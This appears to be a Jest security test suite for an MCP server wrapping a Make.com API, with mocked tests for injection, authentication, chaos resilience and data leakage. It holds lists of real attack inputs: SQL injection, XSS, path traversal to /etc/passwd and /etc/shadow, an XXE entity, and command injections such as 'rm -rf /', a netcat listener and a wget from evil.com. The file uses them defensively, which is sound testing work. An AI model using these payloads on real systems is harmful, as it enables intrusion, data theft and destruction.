/**
 * Advanced Security Testing Suite
 * Implements comprehensive security testing patterns including chaos engineering,
 * vulnerability testing, and advanced attack simulation
 */

import { jest, describe, it, expect, beforeEach, afterEach } from '@jest/globals';
import { UserError } from 'fastmcp';
import { MockMakeApiClient } from '../mocks/make-api-client.mock.js';
import { 
  createMockServer, 
  findTool, 
  executeTool 
} from '../utils/test-helpers.js';

// Advanced chaos engineering patterns
class ChaosMonkey {
  private failureRate: number;
  private latencyMs: number;
  private scenarios: string[];

  constructor(config: { failureRate?: number; latencyMs?: number; scenarios?: string[] }) {
    this.failureRate = config.failureRate || 0.1;
    this.latencyMs = config.latencyMs || 5000;
    this.scenarios = config.scenarios || ['latency', 'error', 'timeout'];
  }

  async wrapService<T extends Record<string, any>>(service: T): Promise<T> {
    return new Proxy(service, {
      get: (target, prop) => {
        if (typeof target[prop] !== 'function') {
          return target[prop];
        }
        
        return async (...args: any[]) => {
          // Randomly inject failures
          if (Math.random() < this.failureRate) {
            const scenario = this.randomScenario();
            await this.injectFailure(scenario);
          }
          
          return target[prop](...args);
        };
      }
    });
  }

  private randomScenario(): string {
    return this.scenarios[Math.floor(Math.random() * this.scenarios.length)];
  }

  private async injectFailure(scenario: string): Promise<void> {
    switch (scenario) {
      case 'latency':
        await new Promise(resolve => setTimeout(resolve, this.latencyMs));
        break;
      case 'error':
        throw new Error('Chaos: Service temporarily unavailable');
      case 'timeout':
        await new Promise(resolve => setTimeout(resolve, 30000));
        throw new Error('Chaos: Request timeout');
      case 'partial':
        throw new Error('Chaos: Partial response');
      default:
        throw new Error('Chaos: Unknown failure');
    }
  }
}

// SQL Injection test payloads
const sqlInjectionPayloads = [
  "' OR '1'='1",
  "'; DROP TABLE users; --",
  "1' UNION SELECT * FROM users--",
  "' OR 1=1--",
  "admin'--",
  "') OR ('1'='1'--",
  "' UNION SELECT password FROM users WHERE username='admin'--",
  "'; INSERT INTO users (username, password) VALUES ('hacker', 'password'); --",
  "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
  "1'; WAITFOR DELAY '00:00:05'--"
];

// XSS test payloads
const xssPayloads = [
  '<script>alert("XSS")</script>',
  '<img src=x onerror=alert("XSS")>',
  '<svg onload=alert("XSS")>',
  'javascript:alert("XSS")',
  '<iframe src="javascript:alert(\'XSS\')">',
  '<<SCRIPT>alert("XSS");//<</SCRIPT>',
  '<object data="javascript:alert(\'XSS\')">',
  '<embed src="javascript:alert(\'XSS\')">',
  '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
  '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">'
];

// Directory traversal payloads
const directoryTraversalPayloads = [
  '../../../etc/passwd',
  '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
  '../../../../../../../etc/shadow',
  '....//....//....//etc/passwd',
  '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  '..%252f..%252f..%252fetc%252fpasswd',
  '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd'
];

// Command injection payloads
const commandInjectionPayloads = [
  '; ls -la',
  '| whoami',
  '&& cat /etc/passwd',
  '$(id)',
  '`ps aux`',
  '; rm -rf /',
  '| nc -l -p 4444',
  '&& wget http://evil.com/malware.sh'
];

describe('Advanced Security Testing Suite', () => {
  let mockServer: any;
  let mockApiClient: MockMakeApiClient;
  let mockTool: jest.MockedFunction<any>;

  beforeEach(() => {
    const serverSetup = createMockServer();
    mockServer = serverSetup.server;
    mockTool = serverSetup.mockTool;
    mockApiClient = new MockMakeApiClient();

    // Reset security state
    jest.clearAllMocks();
  });

  afterEach(() => {
    jest.clearAllMocks();
    mockApiClient.reset();
  });

  describe('SQL Injection Prevention', () => {
    sqlInjectionPayloads.forEach((payload, index) => {
      it(`should safely handle SQL injection payload ${index + 1}: ${payload.substring(0, 20)}...`, async () => {
        mockApiClient.mockResponse('POST', '/api/login', {
          success: false,
          error: { message: 'Invalid credentials', code: 'AUTH_FAILED' }
        });

        const { addPermissionTools } = await import('../../src/tools/permissions.js');
        addPermissionTools(mockServer, mockApiClient as any);
        
        const tool = findTool(mockTool, 'get-current-user');
        
        // Simulate SQL injection attempt through API parameters
        mockApiClient.mockResponse('GET', '/users/me', {
          success: false,
          error: { message: 'Invalid request', code: 'VALIDATION_ERROR' }
        });

        await expect(executeTool(tool, {})).rejects.toThrow(UserError);
        
        // Verify no SQL syntax errors are exposed
        const calls = mockApiClient.getCallLog();
        expect(calls.length).toBe(1);
        
        // Ensure error doesn't contain SQL-related information
        try {
          await executeTool(tool, {});
        } catch (error) {
          expect(error.message).not.toContain('SQL');
          expect(error.message).not.toContain('syntax');
          expect(error.message).not.toContain('TABLE');
          expect(error.message).not.toContain('SELECT');
        }
      });
    });

    it('should prevent SQL injection in search parameters', async () => {
      mockApiClient.mockResponse('GET', '/users', {
        success: true,
        data: [],
        metadata: { total: 0 }
      });

      const { addPermissionTools } = await import('../../src/tools/permissions.js');
      addPermissionTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'list-users');
      
      // Test SQL injection in search parameter
      await executeTool(tool, {
        search: "'; DROP TABLE users; --",
        limit: 10
      });

      const calls = mockApiClient.getCallLog();
      expect(calls[0].params.search).toBe("'; DROP TABLE users; --");
      
      // Verify the search parameter is properly escaped/sanitized
      // In a real implementation, this would be handled by the API layer
    });
  });

  describe('XSS Prevention', () => {
    xssPayloads.forEach((payload, index) => {
      it(`should sanitize XSS payload ${index + 1}: ${payload.substring(0, 20)}...`, async () => {
        mockApiClient.mockResponse('POST', '/teams', {
          success: true,
          data: {
            id: 12345,
            name: payload, // Malicious name
            description: 'Team description',
            organizationId: 67890
          }
        });

        const { addPermissionTools } = await import('../../src/tools/permissions.js');
        addPermissionTools(mockServer, mockApiClient as any);
        
        const tool = findTool(mockTool, 'create-team');
        const result = await executeTool(tool, {
          name: payload,
          description: 'Test team',
          organizationId: 67890
        });

        // Verify script tags are not executed in response
        expect(result).not.toContain('<script>');
        expect(result).not.toContain('javascript:');
        expect(result).not.toContain('onerror=');
        expect(result).not.toContain('onload=');
        
        // Response should contain escaped or sanitized content
        const parsed = JSON.parse(result);
        expect(parsed.team.name).toBeDefined();
      });
    });

    it('should prevent XSS in error messages', async () => {
      const xssPayload = '<script>alert("XSS")</script>';
      
      mockApiClient.mockResponse('GET', '/users/99999', {
        success: false,
        error: { message: `User not found: ${xssPayload}` }
      });

      const { addPermissionTools } = await import('../../src/tools/permissions.js');
      addPermissionTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'get-user');
      
      await expect(executeTool(tool, { userId: 99999 })).rejects.toThrow();
      
      try {
        await executeTool(tool, { userId: 99999 });
      } catch (error) {
        // Error message should not contain unescaped script tags
        expect(error.message).not.toContain('<script>');
        expect(error.message).not.toContain('javascript:');
      }
    });
  });

  describe('Directory Traversal Prevention', () => {
    directoryTraversalPayloads.forEach((payload, index) => {
      it(`should prevent directory traversal payload ${index + 1}: ${payload}`, async () => {
        mockApiClient.mockResponse('GET', '/files', {
          success: false,
          error: { message: 'Invalid file path', code: 'INVALID_PATH' }
        });

        // Simulate file system access attempt
        const mockFileAccess = jest.fn();
        
        // Try to access file with traversal payload
        try {
          mockFileAccess(payload);
        } catch (error) {
          expect(error).toBeDefined();
        }

        // Verify payload doesn't access system files
        expect(mockFileAccess).not.toHaveBeenCalledWith(
          expect.stringContaining('/etc/passwd')
        );
        expect(mockFileAccess).not.toHaveBeenCalledWith(
          expect.stringContaining('system32')
        );
      });
    });
  });

  describe('Command Injection Prevention', () => {
    commandInjectionPayloads.forEach((payload, index) => {
      it(`should prevent command injection payload ${index + 1}: ${payload}`, async () => {
        mockApiClient.mockResponse('POST', '/scenarios', {
          success: false,
          error: { message: 'Invalid scenario name', code: 'VALIDATION_ERROR' }
        });

        // Simulate command injection attempt through scenario name
        const { addScenarioTools } = await import('../../src/tools/scenarios.js');
        addScenarioTools(mockServer, mockApiClient as any);
        
        const tool = findTool(mockTool, 'create-scenario');
        
        await expect(executeTool(tool, {
          name: `test${payload}`,
          folderId: 12345
        })).rejects.toThrow(UserError);

        // Verify no system commands are executed
        const calls = mockApiClient.getCallLog();
        expect(calls[0].data.name).toBe(`test${payload}`);
      });
    });
  });

  describe('Authentication Security', () => {
    describe('Brute Force Protection', () => {
      it('should implement rate limiting for authentication attempts', async () => {
        const username = 'testuser@example.com';
        
        // Simulate multiple failed login attempts
        for (let i = 0; i < 5; i++) {
          mockApiClient.mockResponse('POST', '/auth/login', {
            success: false,
            error: { message: 'Invalid credentials', code: 'AUTH_FAILED' }
          });
        }

        // 6th attempt should be rate limited
        mockApiClient.mockResponse('POST', '/auth/login', {
          success: false,
          error: { 
            message: 'Too many login attempts. Account temporarily locked.',
            code: 'RATE_LIMITED',
            retryAfter: 900 // 15 minutes
          }
        });

        // Verify rate limiting is in effect
        const calls = mockApiClient.getCallLog();
        expect(calls.length).toBeGreaterThan(0);
      });

      it('should implement exponential backoff for failed attempts', async () => {
        const attemptTimes: number[] = [];
        
        for (let i = 0; i < 3; i++) {
          attemptTimes.push(Date.now());
          
          mockApiClient.mockResponse('POST', '/auth/login', {
            success: false,
            error: { 
              message: 'Invalid credentials',
              code: 'AUTH_FAILED',
              retryAfter: Math.pow(2, i) * 1000 // Exponential backoff
            }
          });
          
          // Simulate delay between attempts
          await new Promise(resolve => setTimeout(resolve, 10));
        }

        expect(attemptTimes.length).toBe(3);
        // In real implementation, verify increasing delays
      });
    });

    describe('Session Security', () => {
      it('should invalidate session on privilege escalation', async () => {
        mockApiClient.mockResponse('GET', '/users/me', {
          success: true,
          data: {
            id: 12345,
            email: 'user@example.com',
            role: 'member',
            sessionId: 'session_123'
          }
        });

        const { addPermissionTools } = await import('../../src/tools/permissions.js');
        addPermissionTools(mockServer, mockApiClient as any);
        
        // First, get current user
        const getUserTool = findTool(mockTool, 'get-current-user');
        await executeTool(getUserTool, {});

        // Simulate role update
        mockApiClient.mockResponse('PATCH', '/teams/67890/users/12345/role', {
          success: true,
          data: {
            id: 12345,
            email: 'user@example.com',
            role: 'admin',
            sessionId: 'session_456' // New session after role change
          }
        });

        const updateRoleTool = findTool(mockTool, 'update-user-role');
        await executeTool(updateRoleTool, {
          userId: 12345,
          role: 'admin',
          teamId: 67890
        });

        // Verify session was invalidated and new one created
        const calls = mockApiClient.getCallLog();
        expect(calls.length).toBe(2);
      });

      it('should enforce session timeout', async () => {
        const sessionStart = Date.now();
        const sessionTimeout = 30 * 60 * 1000; // 30 minutes

        mockApiClient.mockResponse('GET', '/users/me', {
          success: false,
          error: {
            message: 'Session expired. Please log in again.',
            code: 'SESSION_EXPIRED',
            timestamp: new Date(sessionStart + sessionTimeout + 1000).toISOString()
          }
        });

        const { addPermissionTools } = await import('../../src/tools/permissions.js');
        addPermissionTools(mockServer, mockApiClient as any);
        
        const tool = findTool(mockTool, 'get-current-user');
        
        await expect(executeTool(tool, {})).rejects.toThrow(UserError);
      });
    });
  });

  describe('Input Validation Security', () => {
    it('should validate all input parameters strictly', async () => {
      const { addPermissionTools } = await import('../../src/tools/permissions.js');
      addPermissionTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'update-user-role');
      
      // Test with invalid user ID
      await expect(executeTool(tool, {
        userId: -1,
        role: 'admin'
      })).rejects.toThrow();
      
      // Test with invalid role
      await expect(executeTool(tool, {
        userId: 12345,
        role: 'superadmin' as any
      })).rejects.toThrow();
      
      // Test with oversized input
      const longString = 'a'.repeat(10000);
      await expect(executeTool(tool, {
        userId: 12345,
        role: 'admin',
        permissions: [longString]
      })).rejects.toThrow();
    });

    it('should sanitize all string inputs', async () => {
      const maliciousInputs = [
        '\x00null_byte',
        '\r\nCRLF_injection',
        '\u0000unicode_null',
        String.fromCharCode(0),
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'
      ];

      mockApiClient.mockResponse('POST', '/teams', {
        success: true,
        data: {
          id: 12345,
          name: 'Sanitized Team Name',
          description: 'Sanitized Description'
        }
      });

      const { addPermissionTools } = await import('../../src/tools/permissions.js');
      addPermissionTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'create-team');
      
      for (const maliciousInput of maliciousInputs) {
        const result = await executeTool(tool, {
          name: maliciousInput,
          description: 'Test description'
        });

        // Verify malicious content is sanitized
        expect(result).not.toContain('\x00');
        expect(result).not.toContain('\r\n');
        expect(result).not.toContain('<!DOCTYPE');
        expect(result).not.toContain('ENTITY');
      }
    });
  });

  describe('Chaos Engineering Resilience', () => {
    it('should handle API service failures gracefully', async () => {
      const chaosApiClient = await new ChaosMonkey({
        failureRate: 0.5,
        scenarios: ['error', 'timeout']
      }).wrapService(mockApiClient);

      const { addPermissionTools } = await import('../../src/tools/permissions.js');
      addPermissionTools(mockServer, chaosApiClient as any);
      
      const tool = findTool(mockTool, 'list-users');
      
      // Test multiple operations, expecting some to fail gracefully
      const results = await Promise.allSettled(
        Array(20).fill(null).map(() => executeTool(tool, { limit: 10 }))
      );
      
      const successful = results.filter(r => r.status === 'fulfilled');
      const failed = results.filter(r => r.status === 'rejected');
      
      // Some should succeed despite chaos
      expect(successful.length).toBeGreaterThan(0);
      
      // Failed operations should have meaningful error messages
      failed.forEach(result => {
        if (result.status === 'rejected') {
          expect(result.reason).toBeInstanceOf(Error);
          expect(result.reason.message).toMatch(/Chaos:|Failed to|Service/);
        }
      });
    });

    it('should maintain data consistency during partial failures', async () => {
      mockApiClient.mockResponse('POST', '/teams', {
        success: true,
        data: { id: 12345, name: 'Test Team' }
      });

      // Simulate network failure after team creation but before member addition
      mockApiClient.mockResponse('POST', '/teams/12345/invite', {
        success: false,
        error: { message: 'Network timeout', code: 'NETWORK_ERROR' }
      });

      const { addPermissionTools } = await import('../../src/tools/permissions.js');
      addPermissionTools(mockServer, mockApiClient as any);
      
      const createTeamTool = findTool(mockTool, 'create-team');
      const inviteUserTool = findTool(mockTool, 'invite-user');
      
      // Create team should succeed
      const teamResult = await executeTool(createTeamTool, {
        name: 'Test Team',
        description: 'Test Description'
      });
      
      expect(teamResult).toContain('created successfully');
      
      // Invite user should fail but not affect team creation
      await expect(executeTool(inviteUserTool, {
        email: 'user@example.com',
        role: 'member',
        teamId: 12345
      })).rejects.toThrow(UserError);
      
      // Team should still exist and be valid
      const calls = mockApiClient.getCallLog();
      expect(calls[0].endpoint).toBe('/teams');
      expect(calls[1].endpoint).toBe('/teams/12345/invite');
    });
  });

  describe('Performance Under Attack', () => {
    it('should maintain performance under high load attack', async () => {
      const startTime = Date.now();
      const concurrentRequests = 50;
      
      mockApiClient.mockResponse('GET', '/users', {
        success: true,
        data: Array(100).fill(null).map((_, i) => ({
          id: i + 1,
          email: `user${i}@example.com`,
          role: 'member'
        })),
        metadata: { total: 100 }
      });

      const { addPermissionTools } = await import('../../src/tools/permissions.js');
      addPermissionTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'list-users');
      
      // Simulate concurrent attack requests
      const requests = Array(concurrentRequests).fill(null).map(() =>
        executeTool(tool, { limit: 100 })
      );
      
      const results = await Promise.all(requests);
      const endTime = Date.now();
      const totalTime = endTime - startTime;
      
      // Verify all requests completed
      expect(results).toHaveLength(concurrentRequests);
      
      // Verify reasonable response time (under 5 seconds for 50 requests)
      expect(totalTime).toBeLessThan(5000);
      
      // Verify all responses are valid
      results.forEach(result => {
        expect(result).toContain('users');
        expect(result).toContain('pagination');
      });
    });

    it('should implement circuit breaker pattern', async () => {
      let failureCount = 0;
      const maxFailures = 5;
      
      // Mock API client that fails consistently
      const originalMockResponse = mockApiClient.mockResponse.bind(mockApiClient);
      mockApiClient.mockResponse = jest.fn((method, endpoint, response) => {
        failureCount++;
        if (failureCount <= maxFailures) {
          return originalMockResponse(method, endpoint, {
            success: false,
            error: { message: 'Service unavailable', code: 'SERVICE_ERROR' }
          });
        } else {
          // Circuit breaker should kick in - stop calling service
          throw new Error('Circuit breaker: Service unavailable');
        }
      });

      const { addPermissionTools } = await import('../../src/tools/permissions.js');
      addPermissionTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'get-current-user');
      
      // First few requests should fail normally
      for (let i = 0; i < maxFailures; i++) {
        await expect(executeTool(tool, {})).rejects.toThrow(UserError);
      }
      
      // After threshold, circuit breaker should activate
      await expect(executeTool(tool, {})).rejects.toThrow('Circuit breaker');
      
      expect(failureCount).toBe(maxFailures + 1);
    });
  });

  describe('Data Leakage Prevention', () => {
    it('should not leak sensitive information in error messages', async () => {
      mockApiClient.mockResponse('GET', '/users/me', {
        success: false,
        error: {
          message: 'Database connection failed',
          details: {
            host: 'internal-db-server.company.com',
            port: 5432,
            database: 'prod_users',
            error: 'Connection timeout after 30s'
          }
        }
      });

      const { addPermissionTools } = await import('../../src/tools/permissions.js');
      addPermissionTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'get-current-user');
      
      await expect(executeTool(tool, {})).rejects.toThrow();
      
      try {
        await executeTool(tool, {});
      } catch (error) {
        // Error should not contain internal system information
        expect(error.message).not.toContain('internal-db-server');
        expect(error.message).not.toContain('5432');
        expect(error.message).not.toContain('prod_users');
        expect(error.message).not.toContain('Connection timeout');
      }
    });

    it('should sanitize logged information', async () => {
      const sensitiveData = {
        password: 'secret123',
        apiKey: 'sk-1234567890abcdef',
        token: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...',
        creditCard: '4111-1111-1111-1111'
      };

      mockApiClient.mockResponse('POST', '/teams', {
        success: true,
        data: {
          id: 12345,
          name: 'Test Team',
          metadata: sensitiveData
        }
      });

      const { addPermissionTools } = await import('../../src/tools/permissions.js');
      addPermissionTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'create-team');
      const result = await executeTool(tool, {
        name: 'Test Team',
        description: 'Team with sensitive metadata'
      });

      // Response should not contain sensitive information
      expect(result).not.toContain('secret123');
      expect(result).not.toContain('sk-1234567890abcdef');
      expect(result).not.toContain('4111-1111-1111-1111');
    });
  });

  describe('Authorization Bypass Prevention', () => {
    it('should prevent horizontal privilege escalation', async () => {
      mockApiClient.mockResponse('GET', '/users/99999', {
        success: false,
        error: {
          message: 'Access denied. User 12345 cannot access user 99999.',
          code: 'AUTHORIZATION_ERROR'
        }
      });

      const { addPermissionTools } = await import('../../src/tools/permissions.js');
      addPermissionTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'get-user');
      
      // User trying to access another user's data
      await expect(executeTool(tool, { userId: 99999 })).rejects.toThrow(UserError);
    });

    it('should prevent vertical privilege escalation', async () => {
      mockApiClient.mockResponse('PATCH', '/users/12345/roles', {
        success: false,
        error: {
          message: 'Insufficient permissions. Member role cannot assign admin role.',
          code: 'AUTHORIZATION_ERROR'
        }
      });

      const { addPermissionTools } = await import('../../src/tools/permissions.js');
      addPermissionTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'update-user-role');
      
      // Lower privilege user trying to assign higher privilege
      await expect(executeTool(tool, {
        userId: 12345,
        role: 'admin'
      })).rejects.toThrow(UserError);
    });
  });
});